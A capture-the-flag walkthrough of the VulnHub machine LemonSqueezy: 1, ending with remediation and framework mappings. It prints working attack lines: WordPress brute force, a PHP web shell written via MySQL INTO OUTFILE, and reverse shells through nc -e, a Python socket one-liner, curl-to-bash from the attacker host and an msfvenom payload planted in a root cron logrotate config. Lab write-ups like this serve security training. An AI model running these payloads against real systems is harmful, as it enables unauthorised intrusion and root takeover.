# LemonSqueezy: 1 — When Life Gives You Misconfigs, Make a Root Shell

Alright guys!! LemonSqueezy: 1 is a goated little machine that packs a surprisingly deep attack chain into a single exposed web service. You've got WordPress enumeration, brute-force, credentials hidden in post drafts, phpMyAdmin SQL file write for web shell delivery, and a cron-based privilege escalation via a world-writable logrotate config. Every step here maps to a real-world technique, and the chain is satisfyingly clean. No cap, the logrotate escalation alone makes this machine worth doing.

Shoutout to the creator for a creative and well-layered challenge.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | LemonSqueezy: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/lemonsqueezy-1,473/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, WordPress user enumeration, WPScan password brute-force, WordPress admin credential discovery, phpMyAdmin SQL INTO OUTFILE web shell, reverse shell delivery, cron-based privilege escalation via world-writable logrotate config |
| **CVEs** | CWE-521 (Weak Password Requirements: orange:ginger brute-forceable), CWE-312 (Cleartext Storage of Sensitive Information: credentials in WordPress post draft), CWE-89 (Improper Neutralization: MySQL INTO OUTFILE file write), CWE-732 (Incorrect Permission Assignment: world-writable /etc/logrotate.d/ config executed by root cron) |
| **APT Groups** | FIN7: documented exploitation of WordPress and phpMyAdmin in retail and hospitality sector attacks for initial foothold; APT41: uses cron-based persistence mechanisms in Linux-targeted intrusions as part of long-term access maintenance |

---

## Attack Summary

```
nmap → port 80 only
  → dirb → /wordpress, /phpmyadmin
  → wpscan: users orange, lemon
  → brute-force orange: ginger
  → WordPress admin login: orange:ginger
  → Posts → draft → plaintext credential: nOt1n@wOrdl1st!
  → phpMyAdmin: orange:nOt1n@wOrdl1st!
  → SQL: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php"
  → http://target/wordpress/backdoor.php?cmd=whoami → www-data
  → reverse shell: nc -e /bin/bash attacker 1234
  → python pty spawn + stty raw -echo
  → LinEnum.sh → /etc/crontab → logrotate every 2 min
  → ls -la /etc/logrotate.d/ → world-writable logrotate config
  → msfvenom reverse payload → overwrite /etc/logrotate.d/logrotate
  → wait <2 min → root callback
  → cat /root/root.txt
```

---

## Methodology

1. Port scan: only port 80 open
2. Directory enumeration: discover /wordpress and /phpmyadmin
3. WordPress user enumeration and password brute-force with WPScan
4. Credential discovery in WordPress post draft
5. phpMyAdmin login with discovered credentials
6. MySQL INTO OUTFILE to write a PHP web shell to web root
7. Execute web shell and deliver reverse shell
8. Shell stabilization for interactive access
9. Automated enumeration with LinEnum to discover cron misconfig
10. World-writable logrotate config exploitation for root shell

---

## Step 1 — Reconnaissance

Identify the host, then scan:

```bash
sudo netdiscover
# Target: 192.168.1.105

nmap -A 192.168.1.105
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

Only port 80. HTTP is the only attack surface.

Add to /etc/hosts if needed:
```bash
echo "192.168.1.105 lemonsqueezy" >> /etc/hosts
```

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Directory Enumeration

```bash
dirb http://192.168.1.105
gobuster dir -u http://192.168.1.105 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Found:**
- `/wordpress` — WordPress installation
- `/phpmyadmin` — phpMyAdmin administration panel

Both are critical findings. WordPress gives us the user enumeration path. phpMyAdmin gives us the file write path.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — WordPress User Enumeration and Brute-Force

Enumerate WordPress users:

```bash
wpscan --url http://192.168.1.105/wordpress -e u
```

**Users found:** `orange`, `lemon`

Brute-force the password for `orange`:

```bash
wpscan --url http://192.168.1.105/wordpress \
  -U orange \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc
```

**Result:** `orange` / `ginger`

**Alternative with WPScan API token for more enumeration:**
```bash
wpscan --url http://192.168.1.105/wordpress -e u,ap,at --api-token YOUR_TOKEN
```

**Real-world note:** WordPress user enumeration via `?author=1` or the REST API is a documented technique that is disabled by proper hardening. WPScan automates this. The password `ginger` is in the top 10,000 of rockyou.txt, which is why brute-force succeeds in minutes. FIN7 routinely uses WPScan-style enumeration as the first step against WordPress-based e-commerce targets.

**MITRE ATT&CK:** T1589.001 — Gather Victim Identity Information: Credentials; T1110.003 — Brute Force: Password Spraying

---

## Step 4 — Credential Discovery in WordPress Post Draft

Log into WordPress admin at `http://192.168.1.105/wordpress/wp-admin/`:
- **Username:** `orange`
- **Password:** `ginger`

Navigate to **Posts** and open any existing draft or post in edit mode. Read the post body carefully.

**Credential found in post content:** `nOt1n@wOrdl1st!`

This is the phpMyAdmin password for the `orange` database user.

**Real-world note:** Developers and sysadmins frequently use CMS draft posts as temporary notepad storage for credentials, configuration snippets, and todo notes. This is a real finding in production WordPress assessments. The WordPress database stores all post content including drafts in plaintext, so any database access (or backup access) exposes these credentials.

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 5 — phpMyAdmin Web Shell via SQL INTO OUTFILE

Log into phpMyAdmin at `http://192.168.1.105/phpmyadmin/`:
- **Username:** `orange`
- **Password:** `nOt1n@wOrdl1st!`

Select the WordPress database. Open the **SQL** query tab.

Use MySQL's file-write capability to drop a PHP web shell into the WordPress web root:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php";
```

Verify the shell works:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=whoami
```

Expected output: `www-data`

**How INTO OUTFILE works:** MySQL's `INTO OUTFILE` statement writes the result of a SELECT query to a file on the server's filesystem. When the MySQL process has write access to the web root and the `FILE` privilege is granted to the database user, any SQL query can create arbitrary files, including PHP web shells.

**Conditions required for this to work:**
1. Database user has `FILE` privilege (or runs as root)
2. MySQL process can write to the web root directory
3. Web root path is known or guessable

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell; T1190 — Exploit Public-Facing Application

---

## Step 6 — Reverse Shell Delivery

Start a listener on the attacker:

```bash
nc -lvnp 1234
```

Trigger a reverse shell through the web shell:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=nc+-e+/bin/bash+192.168.1.112+1234
```

If `nc -e` is unavailable (many distributions ship netcat without `-e`), use:

```
# Python reverse shell (URL-encoded):
http://192.168.1.105/wordpress/backdoor.php?cmd=python3+-c+'import+socket,os,pty;s=socket.socket();s.connect(("192.168.1.112",1234));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("/bin/bash")'
```

Or stage with curl from attacker:
```bash
# On attacker: create shell.sh with reverse shell payload, serve it
python3 -m http.server 8000
# On target via web shell:
http://192.168.1.105/wordpress/backdoor.php?cmd=curl+http://192.168.1.112:8000/shell.sh|bash
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Shell Stabilization

The raw netcat shell is not interactive. Stabilize it:

```bash
# On the target:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# On the attacker, press Ctrl+Z:
stty raw -echo; fg
# Press Enter twice
```

Read user flag:

```bash
cat ~/user.txt
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 8 — Automated Enumeration with LinEnum

Host LinEnum on the attacker:

```bash
python3 -m http.server 8000
```

Download and run on the target:

```bash
cd /var/www/html/wordpress
wget http://192.168.1.112:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh | tee /tmp/linenum.txt
```

Review crontab:

```bash
cat /etc/crontab
```

Finding: a cron job runs `logrotate` every 2 minutes.

Check the logrotate config directory:

```bash
ls -la /etc/logrotate.d/
```

**Critical finding:** `/etc/logrotate.d/logrotate` is world-writable (permissions: 777 or 666).

**MITRE ATT&CK:** T1053.003 — Scheduled Task/Job: Cron

---

## Step 9 — Cron Privilege Escalation via World-Writable logrotate Config

Generate a reverse shell payload with msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.112 LPORT=4444 R
```

Copy the output payload (looks like: `mkfifo /tmp/kqvh; nc ...`).

Overwrite the logrotate config on the target with the payload:

```bash
echo '<paste msfvenom output here>' > /etc/logrotate.d/logrotate
```

Start the root shell listener on the attacker:

```bash
nc -lvnp 4444
```

Wait up to 2 minutes for the cron job to run. When logrotate executes the config file as root, the payload triggers a root reverse shell callback.

**Why this works:** logrotate reads configuration files from `/etc/logrotate.d/`. If any of these files is world-writable, any user can overwrite it with arbitrary commands. When cron runs logrotate as root, those commands execute as root. This is CWE-732: a world-writable file executed by a privileged process.

**Real-world note:** This exact escalation pattern has been found in production environments at major organizations. The most famous variant is the logrotate exploit (CVE-2016-9560 and related issues), but world-writable cron config files require no CVE, just misconfigured permissions. APT41 uses cron-based persistence in Linux-targeted intrusions as a durable root persistence mechanism.

**MITRE ATT&CK:** T1053.003 — Scheduled Task/Job: Cron; T1548.001 — Setuid and Setgid

---

## Step 10 — Root Flag

After the root shell callback:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
cat root.txt
```

(☞ﾟヮﾟ)☞ Root. LemonSqueezy is fully squeezed. gg.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | orange:ginger | WPScan brute-force | WordPress admin |
| Credential | orange:nOt1n@wOrdl1st! | WordPress post draft | phpMyAdmin login |
| Web shell | /wordpress/backdoor.php | MySQL INTO OUTFILE | OS command execution |
| Initial shell | www-data | Reverse shell via backdoor.php | Web server access |
| User flag | user.txt | ~/user.txt | User-level proof |
| Root shell | uid=0(root) | World-writable logrotate cron | Full system access |
| Root flag | root.txt | /root/root.txt | Root-level proof |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | WordPress password orange:ginger brute-forceable | Weak CMS passwords are trivially cracked; WPScan is freely available and widely used | Enforce strong passwords; implement account lockout; disable XML-RPC if unused |
| 2 | Credentials stored in WordPress post draft | CMS draft posts are a consistent real-world credential discovery source | Never use CMS drafts as notepads; use a password manager or secrets management solution |
| 3 | phpMyAdmin publicly accessible | phpMyAdmin should never be Internet-facing; admin-equivalent database access enables web shell creation | Bind phpMyAdmin to localhost; restrict with HTTP auth or IP allowlist |
| 4 | MySQL INTO OUTFILE creates web shells | FILE privilege + writable web root = web shell creation from any SQL client | Revoke FILE privilege from all web application database users; restrict MySQL to web root read-only |
| 5 | World-writable /etc/logrotate.d/ config executed by root cron | This is a classic privilege escalation finding in container and VM environments | chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*; audit cron with LinPEAS/LinEnum |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Brute Force: Password Spraying | T1110.003 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Server Software Component: Web Shell | T1505.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Persistence | Persistence | Scheduled Task/Job: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Setuid and Setgid Abuse | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Enforce strong passwords**: Enable brute-force protection in WordPress (Limit Login Attempts plugin or Wordfence); disable XML-RPC if not needed
2. **Audit WordPress posts for credentials**: Grep all post and postmeta tables for credential-like strings; implement a data classification policy
3. **Restrict phpMyAdmin access**: Bind to `127.0.0.1` in phpMyAdmin config; add HTTP basic auth in Apache; implement IP allowlist
4. **Revoke MySQL FILE privilege**: `REVOKE FILE ON *.* FROM 'orange'@'localhost';`; verify no web app user has SUPER or FILE privileges
5. **Fix logrotate permissions**: `chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*`; implement regular permission audits

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-facing admin panels (phpMyAdmin, wp-admin) |
| Protect | Access Control | Restrict phpMyAdmin to localhost; disable XML-RPC |
| Protect | Data Security | No credentials in CMS content; revoke FILE privilege |
| Detect | Anomalies | Alert on INTO OUTFILE queries; monitor cron job changes; detect web shells |
| Respond | Response Planning | Remove web shell; rotate all credentials; fix logrotate permissions |
| Recover | Recovery Planning | Audit all WordPress content for credentials; rebuild if root access achieved |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | MySQL FILE privilege revoked; logrotate configs owned by root |
| IA-5 | Authenticator Management | Strong WordPress passwords; phpMyAdmin credentials rotated |
| CM-7 | Least Functionality | phpMyAdmin restricted to localhost; XML-RPC disabled |
| CM-6 | Configuration Settings | World-writable logrotate configs: chmod 644 |
| SI-3 | Malware Protection | HIDS to detect web shell creation and cron modification |

### CISA KEV

MySQL INTO OUTFILE web shell creation (CWE-89/CWE-434 pattern) is referenced in CISA Alert AA21-008A documenting threat actor TTPs for web application compromise. The world-writable cron config escalation pattern aligns with CISA guidance on Linux privilege escalation prevention. Organizations should apply CISA AA22-279A on internet-accessible management interfaces including phpMyAdmin.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Identities and Credentials | MIL3 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Situational Awareness (SITUATION) | Implement Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (phpMyAdmin localhost-only; revoke FILE privilege)
- **D3-OAM** — Operating System Administrative Management (fix logrotate permissions; restrict cron)
- **D3-DQSA** — Database Query String Analysis (detect INTO OUTFILE patterns in MySQL query logs)
- **D3-FH** — File Hashing (detect web shell creation in web root via file integrity monitoring)

---

## Final Thoughts

LemonSqueezy delivers a clean, layered attack chain that rewards thorough enumeration at every step. The credential in the WordPress post draft is the kind of finding that makes security professionals wince because it's so common in real assessments. The logrotate privilege escalation is a beautiful example of how a single misconfigured file permission can hand root to any local user.

The machine teaches you to look everywhere: directory enumeration finds phpMyAdmin, post content reveals credentials, LinEnum finds the cron job, and permission auditing reveals the world-writable file. Remove any one enumeration step and you stall the chain.

Thanks guys!! (❍ᴥ❍ʋ)
